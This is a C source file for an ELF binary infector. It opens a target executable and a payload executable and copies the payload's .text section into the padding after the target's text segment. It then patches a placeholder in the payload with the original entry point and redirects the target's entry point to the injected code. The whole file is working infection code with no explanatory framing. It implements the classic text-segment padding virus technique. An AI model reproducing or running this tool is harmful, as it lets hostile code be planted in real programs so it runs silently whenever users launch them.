#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdint.h>

#include <elf.h>
#include <sys/mman.h>


typedef struct {
    Elf64_Ehdr* ehdr;
    Elf64_Phdr* phdr;
    Elf64_Shdr* shdr;

    char* file_name;

    uint32_t file_size;
    int32_t fd;
} elf_stat;


elf_stat* load_elf(char* file_name) {
    uint32_t file_size;
    int32_t fd;
    struct stat file_info;
    Elf64_Ehdr* ehdr;
    Elf64_Phdr* phdr;
    Elf64_Shdr* shdr;
    elf_stat* stat;

    fd = open(file_name, O_RDWR, 0);
    if (fd < 0) {
        fprintf(stderr, "Error on opening %s\n", file_name);
        exit(1);
    }

    fstat(fd, &file_info);

    file_size = file_info.st_size;

    ehdr = (Elf64_Ehdr*) mmap(0, file_size,
                              PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_SHARED, fd, 0);
    if (ehdr == MAP_FAILED) {
        fprintf(stderr, "Error on file mapping %s\n", file_name);
        exit(1);
    }

    phdr = (Elf64_Phdr*) ((char*) ehdr + ehdr->e_phoff);
    shdr = (Elf64_Shdr*) ((char*) ehdr + ehdr->e_shoff);

    stat = (elf_stat*) malloc(sizeof(elf_stat));

    stat->ehdr = ehdr;
    stat->phdr = phdr;
    stat->shdr = shdr;
    stat->file_name = file_name;
    stat->fd = fd;
    stat->file_size = file_size;

    return stat;
}


char* get_section(elf_stat* stat, const char* s_name, uint64_t* size) {
    uint16_t i;
    char* section_name;
    char* section_data;
    Elf64_Shdr* start_section = stat->shdr + stat->ehdr->e_shstrndx;
    char* section_table = (char*) stat->ehdr + start_section->sh_offset;

    for (i = 0; i < stat->ehdr->e_shnum; i++) {
        section_name = section_table + stat->shdr[i].sh_name;
        if (!strcmp(section_name, s_name)) {
            *size = stat->shdr[i].sh_size;
            section_data = (char*) malloc(*size);
            memcpy(section_data, (char*)stat->ehdr + stat->shdr[i].sh_offset, *size);
            return section_data;
        }
    }

    return NULL;
}


int replace_fake_entry_point(char* payload_data, int payload_size, uint64_t fake, uint64_t real) {
    int i;
    uint64_t value;

    for (i = 0; i < payload_size; i++) {
        value = *((uint64_t*) (payload_data + i));
        if ((value ^ fake) == 0) {
            *((uint64_t*) (payload_data + i)) = real;
            return 0;
        }
    }
    return -1;
}


int prepare_infection(elf_stat* target, elf_stat* payload) {
    uint16_t i;
    uint64_t end_of_text_segment, gap_size, payload_text_size;
    Elf64_Addr old_entry_point, payload_vaddr;
    char* payload_text_section;
    char* mem;
    Elf64_Phdr text_segment, data_segment;

    old_entry_point = target->ehdr->e_entry;

    printf("old_entry_point %#lx\n", old_entry_point);

    payload_text_section = get_section(payload, ".text", &payload_text_size);
    if (payload_text_section == NULL) {
        fprintf(stderr, "Can't find .text section\n");
        exit(1);
    }

    for (i = 0; i < target->ehdr->e_phnum; i++){
        if (target->phdr[i].p_type == PT_LOAD && target->phdr[i].p_offset == 0) {
            text_segment = target->phdr[i];
            data_segment = target->phdr[i+1];

            end_of_text_segment = text_segment.p_offset + text_segment.p_filesz;
            gap_size = data_segment.p_offset - end_of_text_segment;
            printf("gap_size = %lu, payload_size = %lu\n", gap_size, payload_text_size);
            if (gap_size < payload_text_size) {
                fprintf(stderr, "Payload size too big");
                exit(1);
            }
            printf("Text segment vaddr = %#lx\n", text_segment.p_vaddr);
            printf("Text segment size = %lu\n", text_segment.p_filesz);
            payload_vaddr = (Elf64_Addr) (text_segment.p_vaddr + end_of_text_segment);
            printf("new_entry_point %#lx\n", payload_vaddr);
            target->phdr[i].p_filesz += payload_text_size;
            target->phdr[i].p_memsz += payload_text_size;
            break;
        }
    }

    for (i = 0; i < target->ehdr->e_shnum; i++){
        if (target->shdr[i].sh_addr + target->shdr[i].sh_size == payload_vaddr) {
            target->shdr[i].sh_size += payload_text_size;
        }
    }

    int res = replace_fake_entry_point(payload_text_section, payload_text_size, (uint64_t) 0x1111111111111111, (uint64_t) old_entry_point);
    if (res == -1) {
        fprintf(stderr, "Cant find replace point\n");
        exit(1);
    }

    target->ehdr->e_entry = payload_vaddr;
    mem = (char*) target->ehdr;
    memcpy(mem + end_of_text_segment, payload_text_section, payload_text_size);

    if (payload_text_section != NULL) {
       free(payload_text_section);
    }

    return 0;
}


int clean_elf_stat(elf_stat* stat) {
    munmap(stat->ehdr, stat->file_size);

    close(stat->fd);
    free(stat);

    return 0;
}


int main(int argc, char* argv[]) {
    elf_stat* target_elf_stat;
    elf_stat* payload_elf_stat;

    if (argc != 3) {
        fprintf(stderr, "Usage: %s target payload\n", argv[0]);
        exit(1);
    }

    target_elf_stat = load_elf(argv[1]);
    payload_elf_stat = load_elf(argv[2]);

    prepare_infection(target_elf_stat, payload_elf_stat);

    clean_elf_stat(target_elf_stat);
    clean_elf_stat(payload_elf_stat);

    return 0;
}